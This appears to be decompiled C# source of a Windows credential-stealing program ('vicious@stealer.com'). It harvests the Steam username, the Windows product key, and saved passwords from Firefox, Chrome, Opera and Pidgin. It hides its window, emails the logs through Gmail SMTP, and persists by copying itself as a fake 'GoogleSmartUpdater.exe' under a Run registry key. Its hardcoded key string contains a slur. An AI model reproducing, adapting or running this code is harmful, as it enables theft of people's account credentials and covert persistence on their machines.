using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

// Token: 0x0200001C RID: 28
[DesignerGenerated]
public partial class Form1 : Form
{
	// Token: 0x06000069 RID: 105 RVA: 0x0000216D File Offset: 0x0000036D
	public Form1()
	{
		this.Load += this.Form1_Load;
		this.InitializeComponent();
	}

	// Token: 0x17000008 RID: 8
	// (get) Token: 0x0600006C RID: 108 RVA: 0x000044DC File Offset: 0x000026DC
	// (set) Token: 0x0600006D RID: 109 RVA: 0x0000218E File Offset: 0x0000038E
	internal virtual TextBox TextBox1
	{
		get
		{
			return this._TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			this._TextBox1 = value;
		}
	}

	// Token: 0x0600006E RID: 110 RVA: 0x000044F0 File Offset: 0x000026F0
	public string method_0()
	{
		FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(Assembly.GetExecutingAssembly().Location);
		return versionInfo.LegalCopyright;
	}

	// Token: 0x0600006F RID: 111 RVA: 0x00004514 File Offset: 0x00002714
	public string method_1(string string_0)
	{
		FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(string_0);
		return versionInfo.ProductVersion;
	}

	// Token: 0x06000070 RID: 112 RVA: 0x00004530 File Offset: 0x00002730
	public string method_2()
	{
		string str = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Steam", "InstallPath", ""));
		string file = str + "\\config\\SteamAppData.vdf";
		string[] array = Class1.Class0_0.FileSystem.ReadAllText(file).Split(new char[]
		{
			'"'
		});
		return array[9];
	}

	// Token: 0x06000071 RID: 113 RVA: 0x00004590 File Offset: 0x00002790
	private void Form1_Load(object sender, EventArgs e)
	{
		Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\firefox.exe";
		string text = this.method_0();
		string[] array = text.Split(new char[]
		{
			'^'
		});
		string text2 = this.method_3(array[0], "Deceptiveisgay", true);
		string password = this.method_3(array[1], "Deceptiveisgay", true);
		string left = array[2];
		if (Operators.CompareString(left, "1", false) == 0)
		{
			try
			{
				this.method_4();
			}
			catch (Exception ex)
			{
			}
		}
		TextBox textBox = this.TextBox1;
		textBox.Text = textBox.Text + ">>>>>>>>>>Steam<<<<<<<<<<" + Environment.NewLine;
		try
		{
			textBox = this.TextBox1;
			textBox.Text = textBox.Text + "Username: " + this.method_2();
		}
		catch (Exception ex2)
		{
		}
		textBox = this.TextBox1;
		textBox.Text += "\r\n";
		textBox = this.TextBox1;
		textBox.Text += "\r\n";
		textBox = this.TextBox1;
		textBox.Text = textBox.Text + ">>>>>>>>>>Windows Key<<<<<<<<<<" + Environment.NewLine;
		textBox = this.TextBox1;
		textBox.Text += Class9.smethod_0();
		textBox = this.TextBox1;
		textBox.Text += "\r\n";
		try
		{
			this.method_6();
		}
		catch (Exception ex3)
		{
		}
		textBox = this.TextBox1;
		textBox.Text += "\r\n";
		this.TextBox1.Text = this.TextBox1.Text + Environment.NewLine + ">>>>>>>>>>FireFox<<<<<<<<<<";
		try
		{
			this.method_5();
		}
		catch (Exception ex4)
		{
		}
		try
		{
			Class4.smethod_0();
		}
		catch (Exception ex5)
		{
		}
		textBox = this.TextBox1;
		textBox.Text += "\r\n";
		textBox = this.TextBox1;
		textBox.Text = textBox.Text + ">>>>>>>>>>Opera<<<<<<<<<<" + Environment.NewLine;
		try
		{
			GClass1 gclass = new GClass1();
			gclass.method_0();
		}
		catch (Exception ex6)
		{
		}
		textBox = this.TextBox1;
		textBox.Text += "\r\n";
		textBox = this.TextBox1;
		textBox.Text = textBox.Text + ">>>>>>>>>>Pidgin<<<<<<<<<<" + Environment.NewLine;
		try
		{
			textBox = this.TextBox1;
			textBox.Text = Conversions.ToString(Operators.AddObject(textBox.Text, GClass2.smethod_1()));
		}
		catch (Exception ex7)
		{
		}
		textBox = this.TextBox1;
		textBox.Text += "\r\n";
		this.Visible = false;
		this.Hide();
		this.ShowInTaskbar = false;
		MailMessage mailMessage = new MailMessage();
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Credentials = new NetworkCredential(text2, password);
		smtpClient.Port = 587;
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.EnableSsl = true;
		mailMessage = new MailMessage();
		try
		{
			mailMessage.To.Add(text2);
			mailMessage.From = new MailAddress("vicious@stealer.com", "New Logs Received!", Encoding.UTF8);
			mailMessage.Subject = Class1.Class0_0.Name + "   " + Conversions.ToString(DateTime.Now) + ":";
			mailMessage.Body = this.TextBox1.Text;
			mailMessage.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
			smtpClient.Send(mailMessage);
		}
		catch (Exception ex8)
		{
		}
		Application.Exit();
	}

	// Token: 0x06000072 RID: 114 RVA: 0x000049D4 File Offset: 0x00002BD4
	public string method_3(string string_0, string string_1, bool bool_0)
	{
		byte[] array = Convert.FromBase64String(string_0);
		byte[] key;
		if (bool_0)
		{
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(string_1));
		}
		else
		{
			key = Encoding.UTF8.GetBytes(string_1);
		}
		ICryptoTransform cryptoTransform = new TripleDESCryptoServiceProvider
		{
			Key = key,
			Mode = CipherMode.ECB,
			Padding = PaddingMode.PKCS7
		}.CreateDecryptor();
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		return Encoding.UTF8.GetString(bytes);
	}

	// Token: 0x06000073 RID: 115 RVA: 0x00004A54 File Offset: 0x00002C54
	public object method_4()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		try
		{
			if (File.Exists(folderPath + "\\GoogleSmartUpdater.exe"))
			{
				Class1.Class0_0.FileSystem.DeleteFile(folderPath + "\\GoogleSmartUpdater.exe");
			}
		}
		catch (Exception ex)
		{
		}
		string location = Assembly.GetExecutingAssembly().Location;
		try
		{
			File.Copy(location, folderPath + "\\GoogleSmartUpdater.exe");
		}
		catch (Exception ex2)
		{
		}
		Class1.Class0_0.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Google Smart Updater", folderPath + "\\GoogleSmartUpdater.exe", RegistryValueKind.String);
		try
		{
			File.SetAttributes(folderPath + "\\GoogleSmartUpdater.exe", FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
		}
		catch (Exception ex3)
		{
		}
		object result;
		return result;
	}

	// Token: 0x06000074 RID: 116 RVA: 0x00004B3C File Offset: 0x00002D3C
	public void method_5()
	{
		bool flag = false;
		Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		string path = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
		string[] directories = Directory.GetDirectories(path);
		foreach (string text in directories)
		{
			if (flag)
			{
				break;
			}
			string[] files = Directory.GetFiles(text);
			foreach (string text2 in files)
			{
				if (flag)
				{
					break;
				}
				if (Regex.IsMatch(text2, "signons.sqlite"))
				{
					Class5.smethod_0(text);
					Class5.string_0 = text2;
				}
			}
		}
		string string_ = Class5.string_0;
		Class5.TSECItem tsecitem = default(Class5.TSECItem);
		Class5.TSECItem tsecitem2 = default(Class5.TSECItem);
		Class5.TSECItem tsecitem3 = default(Class5.TSECItem);
		Class7.Class8 @class = new Class7.Class8(string_);
		DataTable dataTable = @class.method_4("SELECT * FROM moz_logins;");
		DataTable dataTable2 = @class.method_4("SELECT * FROM moz_disabledHosts;");
		try
		{
			foreach (object obj in dataTable2.Rows)
			{
				DataRow dataRow = (DataRow)obj;
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		long long_ = Class5.smethod_1();
		Class5.smethod_2(long_, true, 0L);
		checked
		{
			try
			{
				foreach (object obj2 in dataTable.Rows)
				{
					DataRow dataRow2 = (DataRow)obj2;
					string str = Convert.ToString(dataRow2["formSubmitURL"].ToString());
					this.TextBox1.Text = this.TextBox1.Text + Environment.NewLine + "URL: " + str;
					StringBuilder stringBuilder = new StringBuilder(dataRow2["encryptedUsername"].ToString());
					int value = Class5.smethod_3(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
					IntPtr intPtr = new IntPtr(value);
					Class5.TSECItem tsecitem4 = (Class5.TSECItem)Marshal.PtrToStructure(intPtr, typeof(Class5.TSECItem));
					if (Class5.smethod_4(ref tsecitem4, ref tsecitem2, 0) == 0 && tsecitem2.int_2 != 0)
					{
						byte[] array3 = new byte[tsecitem2.int_2 - 1 + 1];
						intPtr = new IntPtr(tsecitem2.int_1);
						Marshal.Copy(intPtr, array3, 0, tsecitem2.int_2);
						this.TextBox1.Text = this.TextBox1.Text + Environment.NewLine + "Username: " + Encoding.ASCII.GetString(array3);
					}
					StringBuilder stringBuilder2 = new StringBuilder(dataRow2["encryptedPassword"].ToString());
					int value2 = Class5.smethod_3(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
					intPtr = new IntPtr(value2);
					Class5.TSECItem tsecitem5 = (Class5.TSECItem)Marshal.PtrToStructure(intPtr, typeof(Class5.TSECItem));
					if (Class5.smethod_4(ref tsecitem5, ref tsecitem3, 0) == 0 && tsecitem3.int_2 != 0)
					{
						byte[] array3 = new byte[tsecitem3.int_2 - 1 + 1];
						intPtr = new IntPtr(tsecitem3.int_1);
						Marshal.Copy(intPtr, array3, 0, tsecitem3.int_2);
						this.TextBox1.Text = string.Concat(new string[]
						{
							this.TextBox1.Text,
							Environment.NewLine,
							"Password: ",
							Encoding.ASCII.GetString(array3),
							"\r\n"
						});
					}
				}
			}
			finally
			{
				IEnumerator enumerator2;
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06000075 RID: 117 RVA: 0x00004F08 File Offset: 0x00003108
	public void method_6()
	{
		TextBox textBox = this.TextBox1;
		textBox.Text = textBox.Text + ">>>>>>>>>>Chrome<<<<<<<<<<" + Environment.NewLine;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				GClass0 gclass = new GClass0(text);
				gclass.method_6("logins");
				if (File.Exists(text))
				{
					int num = 0;
					int num2 = gclass.method_7() - 1;
					for (int i = num; i <= num2; i++)
					{
						string text2 = gclass.method_9(i, "origin_url");
						string text3 = gclass.method_9(i, "username_value");
						string text4 = Class3.smethod_0(Encoding.Default.GetBytes(gclass.method_9(i, "password_value")));
						if (Operators.CompareString(text3, "", false) != 0 & Operators.CompareString(text4, "", false) != 0)
						{
							this.TextBox1.AppendText(string.Concat(new string[]
							{
								"Host: ",
								text2,
								Environment.NewLine,
								"UserName: ",
								text3,
								Environment.NewLine,
								"Password: ",
								text4,
								Environment.NewLine
							}));
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x04000035 RID: 53
	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;
}
